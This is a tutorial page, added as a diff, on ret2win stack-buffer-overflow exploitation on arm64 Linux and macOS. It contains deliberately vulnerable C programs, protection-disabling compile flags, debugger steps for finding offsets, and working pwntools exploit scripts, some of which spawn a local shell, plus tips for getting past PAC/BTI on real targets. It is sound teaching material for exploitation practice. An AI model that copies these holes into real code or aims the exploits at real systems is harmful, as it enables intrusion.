@@ -1,0 +1,506 @@
+# Ret2win - arm64
+
+Find an introduction to arm64 in:
+
+## Code
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+
+void win() {
+    printf("Congratulations!\n");
+}
+
+void vulnerable_function() {
+    char buffer[64];
+    read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
+}
+
+int main() {
+    vulnerable_function();
+    return 0;
+}
+```
+
+Compile without pie and canary:
+
+```bash
+clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie -mbranch-protection=none
+```
+
+- The extra flag `-mbranch-protection=none` disables AArch64 Branch Protection (PAC/BTI). If your toolchain defaults to enabling PAC or BTI, this keeps the lab reproducible. To check whether a compiled binary uses PAC/BTI you can:
+  - Look for AArch64 GNU properties:
+    - `readelf --notes -W ret2win | grep -E 'AARCH64_FEATURE_1_(BTI|PAC)'`
+  - Inspect prologues/epilogues for `paciasp`/`autiasp` (PAC) or for `bti c` landing pads (BTI):
+    - `objdump -d ret2win | head -n 40`
+
+### AArch64 calling convention quick facts
+
+- The link register is `x30` (a.k.a. `lr`), and functions typically save `x29`/`x30` with `stp x29, x30, [sp, #-16]!` and restore them with `ldp x29, x30, [sp], #16; ret`.
+- This means the saved return address lives at `sp+8` relative to the frame base. With a `char buffer[64]` placed below, the usual overwrite distance to the saved `x30` is 64 (buffer) + 8 (saved x29) = 72 bytes — exactly what we’ll find below.
+- The stack pointer must remain 16‑byte aligned at function boundaries. If you build ROP chains later for more complex scenarios, keep the SP alignment or you may crash on function epilogues.
+
+## Finding the offset
+
+### Pattern option
+
+This example was created using [**GEF**](https://github.com/bata24/gef):
+
+Stat gdb with gef, create pattern and use it:
+
+```bash
+gdb -q ./ret2win
+pattern create 200
+run
+```
+
+<img src="../../../images/image (1205).png" alt=""><figcaption></figcaption>
+
+arm64 will try to return to the address in the register x30 (which was compromised), we can use that to find the pattern offset:
+
+```bash
+pattern search $x30
+```
+
+<img src="../../../images/image (1206).png" alt=""><figcaption></figcaption>
+
+**The offset is 72 (9x48).**
+
+### Stack offset option
+
+Start by getting the stack address where the pc register is stored:
+
+```bash
+gdb -q ./ret2win
+b *vulnerable_function + 0xc
+run
+info frame
+```
+
+<img src="../../../images/image (1207).png" alt=""><figcaption></figcaption>
+
+Now set a breakpoint after the `read()` and continue until the `read()` is executed and set a pattern such as 13371337:
+
+```
+b *vulnerable_function+28
+c
+```
+
+<img src="../../../images/image (1208).png" alt=""><figcaption></figcaption>
+
+Find where this pattern is stored in memory:
+
+<img src="../../../images/image (1209).png" alt=""><figcaption></figcaption>
+
+Then: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**
+
+<img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption>
+
+## No PIE
+
+### Regular
+
+Get the address of the **`win`** function:
+
+```bash
+objdump -d ret2win | grep win
+ret2win:     file format elf64-littleaarch64
+00000000004006c4 <win>:
+```
+
+Exploit:
+
+```python
+from pwn import *
+
+# Configuration
+binary_name = './ret2win'
+p = process(binary_name)
+# Optional but nice for AArch64
+context.arch = 'aarch64'
+
+# Prepare the payload
+offset = 72
+ret2win_addr = p64(0x00000000004006c4)
+payload = b'A' * offset + ret2win_addr
+
+# Send the payload
+p.send(payload)
+
+# Check response
+print(p.recvline())
+p.close()
+```
+
+<img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption>
+
+### Off-by-1
+
+Actually this is going to by more like a off-by-2 in the stored PC in the stack. Instead of overwriting all the return address we are going to overwrite **only the last 2 bytes** with `0x06c4`.
+
+```python
+from pwn import *
+
+# Configuration
+binary_name = './ret2win'
+p = process(binary_name)
+
+# Prepare the payload
+offset = 72
+ret2win_addr = p16(0x06c4)
+payload = b'A' * offset + ret2win_addr
+
+# Send the payload
+p.send(payload)
+
+# Check response
+print(p.recvline())
+p.close()
+```
+
+<img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption>
+
+You can find another off-by-one example in ARM64 in [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/), which is a real off-by-**one** in a fictitious vulnerability.
+
+## With PIE
+
+> [!TIP]
+> Compile the binary **without the `-no-pie` argument**
+
+### Off-by-2
+
+Without a leak we don't know the exact address of the winning function but we can know the offset of the function from the binary and knowing that the return address we are overwriting is already pointing to a close address, it's possible to leak the offset to the win function (**0x7d4**) in this case and just use that offset:
+
+<img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption>
+
+```python
+from pwn import *
+
+# Configuration
+binary_name = './ret2win'
+p = process(binary_name)
+
+# Prepare the payload
+offset = 72
+ret2win_addr = p16(0x07d4)
+payload = b'A' * offset + ret2win_addr
+
+# Send the payload
+p.send(payload)
+
+# Check response
+print(p.recvline())
+p.close()
+```
+
+## macOS
+
+### Code
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+__attribute__((noinline))
+void win(void) {
+    system("/bin/sh"); // <- **our target**
+}
+
+void vulnerable_function(void) {
+    char buffer[64];
+    // **BOF**: reading 256 bytes into a 64B stack buffer
+    read(STDIN_FILENO, buffer, 256);
+}
+
+int main(void) {
+    printf("win() is at %p\n", win);
+    vulnerable_function();
+    return 0;
+}
+```
+
+Compile without canary (in macOS you can't disable PIE):
+
+```bash
+clang -o bof_macos bof_macos.c -fno-stack-protector -Wno-format-security
+```
+
+Execute without ASLR (although as we have an address leak, we don't need it):
+
+```bash
+env DYLD_DISABLE_ASLR=1 ./bof_macos
+```
+
+> [!TIP]
+> It's not possible to disable NX in macOS because in arm64 this mode is implemented at hardware level so you can't disable it, so you won't be finding examples with shellcode in stack in macOS.
+
+### Find the offset
+
+- Generate a pattern:
+
+```bash
+python3 - << 'PY'
+from pwn import *
+print(cyclic(200).decode())
+PY
+```
+
+- Run the program and input the pattern to cause a crash:
+
+```bash
+lldb ./bof_macos
+(lldb) env DYLD_DISABLE_ASLR=1
+(lldb) run
+# paste the 200-byte cyclic string, press Enter
+```
+
+- Check register `x30` (the return address) to find the offset:
+
+```bash
+(lldb) register read x30
+```
+
+- Use `cyclic -l <value>` to find the exact offset:
+
+```bash
+python3 - << 'PY'
+from pwn import *
+print(cyclic_find(0x61616173))
+PY
+
+# Replace 0x61616173 with the 4 first bytes from the value of x30
+```
+
+- Thats how I found the offset `72`, putting in that offset the address of `win()` function you can execute that function and get a shell (running without ASLR).
+
+### Exploit
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import re
+
+# Load the binary
+binary_name = './bof_macos'
+
+# Start the process
+p = process(binary_name, env={"DYLD_DISABLE_ASLR": "1"})
+
+# Read the address printed by the program
+output = p.recvline().decode()
+print(f"Received: {output.strip()}")
+
+# Extract the win() address using regex
+match = re.search(r'win\(\) is at (0x[0-9a-fA-F]+)', output)
+if not match:
+    print("Failed to extract win() address")
+    p.close()
+    exit(1)
+
+win_address = int(match.group(1), 16)
+print(f"Extracted win() address: {hex(win_address)}")
+
+# Offset calculation:
+# Buffer starts at sp, return address at sp+0x40 (64 bytes)
+# We need to fill 64 bytes, then overwrite the saved x29 (8 bytes), then x30 (8 bytes)
+offset = 64 + 8  # 72 bytes total to reach the return address
+
+# Craft the payload - ARM64 addresses are 8 bytes
+payload = b'A' * offset + p64(win_address)
+print(f"Payload length: {len(payload)}")
+
+# Send the payload
+p.send(payload)
+
+# Drop to an interactive session
+p.interactive()
+```
+
+## macOS - 2nd example
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+__attribute__((noinline))
+void leak_anchor(void) {
+    puts("leak_anchor reached");
+}
+
+__attribute__((noinline))
+void win(void) {
+    puts("Killed it!");
+    system("/bin/sh");
+    exit(0);
+}
+
+__attribute__((noinline))
+void vuln(void) {
+    char buf[64];
+    FILE *f = fopen("/tmp/exploit.txt", "rb");
+    if (!f) {
+        puts("[*] Please create /tmp/exploit.txt with your payload");
+        return;
+    }
+    // Vulnerability: no bounds check → stack overflow
+    fread(buf, 1, 512, f);
+    fclose(f);
+    printf("[*] Copied payload from /tmp/exploit.txt\n");
+}
+
+int main(void) {
+    // Unbuffered stdout so leaks are immediate
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    // Leak a different function, not main/win
+    printf("[*] LEAK (leak_anchor): %p\n", (void*)&leak_anchor);
+
+    // Sleep 3s
+    sleep(3);
+
+    vuln();
+    return 0;
+}
+```
+
+Compile without canary (in macOS you can't disable PIE):
+
+```bash
+clang -o bof_macos bof_macos.c -fno-stack-protector -Wno-format-security
+```
+
+### Find the offset
+
+- Generate a pattern into the file `/tmp/exploit.txt`:
+
+```bash
+python3 - << 'PY'
+from pwn import *
+with open("/tmp/exploit.txt", "wb") as f:
+    f.write(cyclic(200))
+PY
+```
+
+- Run the program to cause a crash:
+
+```bash
+lldb ./bof_macos
+(lldb) run
+```
+
+- Check register `x30` (the return address) to find the offset:
+
+```bash
+(lldb) register read x30
+```
+
+- Use `cyclic -l <value>` to find the exact offset:
+
+```bash
+python3 - << 'PY'
+from pwn import *
+print(cyclic_find(0x61616173))
+PY
+# Replace 0x61616173 with the 4 first bytes from the value of x30
+```
+
+- Thats how I found the offset `72`, putting in that offset the address of `win()` function you can execute that function and get a shell (running without ASLR).
+
+### Calculate the address of win()
+
+- The binary is PIE, using the leak of `leak_anchor()` function and knowing the offset of `win()` function from `leak_anchor()` function we can calculate the address of `win()` function.
+
+```bash
+objdump -d bof_macos | grep -E 'leak_anchor|win'
+
+0000000100000460 <_leak_anchor>:
+000000010000047c <_win>:
+```
+
+- The offset is `0x47c - 0x460 = 0x1c`
+
+### Exploit
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import re
+import os
+
+# Load the binary
+binary_name = './bof_macos'
+# Start the process
+p = process(binary_name)
+
+# Read the address printed by the program
+output = p.recvline().decode()
+print(f"Received: {output.strip()}")
+
+# Extract the leak_anchor() address using regex
+match = re.search(r'LEAK \(leak_anchor\): (0x[0-9a-fA-F]+)', output)
+if not match:
+    print("Failed to extract leak_anchor() address")
+    p.close()
+    exit(1)
+leak_anchor_address = int(match.group(1), 16)
+print(f"Extracted leak_anchor() address: {hex(leak_anchor_address)}")
+
+# Calculate win() address
+win_address = leak_anchor_address + 0x1c
+print(f"Calculated win() address: {hex(win_address)}")
+
+# Offset calculation:
+# Buffer starts at sp, return address at sp+0x40 (64 bytes)
+# We need to fill 64 bytes, then overwrite the saved x29 (8 bytes), then x30 (8 bytes)
+offset = 64 + 8  # 72 bytes total to reach the return address
+
+# Craft the payload - ARM64 addresses are 8 bytes
+payload = b'A' * offset + p64(win_address)
+print(f"Payload length: {len(payload)}")
+
+# Write the payload to /tmp/exploit.txt
+with open("/tmp/exploit.txt", "wb") as f:
+    f.write(payload)
+
+print("[*] Payload written to /tmp/exploit.txt")
+
+# Drop to an interactive session
+p.interactive()
+```
+
+## Notes on modern AArch64 hardening (PAC/BTI) and ret2win
+
+- If the binary is compiled with AArch64 Branch Protection, you may see `paciasp`/`autiasp` or `bti c` emitted in function prologues/epilogues. In that case:
+  - Returning to an address that is not a valid BTI landing pad may raise a `SIGILL`. Prefer targeting the exact function entry that contains `bti c`.
+  - If PAC is enabled for returns, naive return‑address overwrites may fail because the epilogue authenticates `x30`. For learning scenarios, rebuild with `-mbranch-protection=none` (shown above). When attacking real targets, prefer non‑return hijacks (e.g., function pointer overwrites) or build ROP that never executes an `autiasp`/`ret` pair that authenticates your forged LR.
+- To check features quickly:
+  - `readelf --notes -W ./ret2win` and look for `AARCH64_FEATURE_1_BTI` / `AARCH64_FEATURE_1_PAC` notes.
+  - `objdump -d ./ret2win | head -n 40` and look for `bti c`, `paciasp`, `autiasp`.
+
+## Running on non‑ARM64 hosts (qemu‑user quick tip)
+
+If you are on x86_64 but want to practice AArch64:
+
+```bash
+# Install qemu-user and AArch64 libs (Debian/Ubuntu)
+sudo apt-get install qemu-user qemu-user-static libc6-arm64-cross
+
+# Run the binary with the AArch64 loader environment
+qemu-aarch64 -L /usr/aarch64-linux-gnu ./ret2win
+
+# Debug with GDB (qemu-user gdbstub)
+qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./ret2win &
+# In another terminal
+gdb-multiarch ./ret2win -ex 'target remote :1234'
+```
+
+### Related HackTricks pages
+
+## References
+
+- Enabling PAC and BTI on AArch64 for Linux (Arm Community, Nov 2024). https://community.arm.com/arm-community-blogs/b/operating-systems-blog/posts/enabling-pac-and-bti-on-aarch64-for-linux
+- Procedure Call Standard for the Arm 64-bit Architecture (AAPCS64). https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst
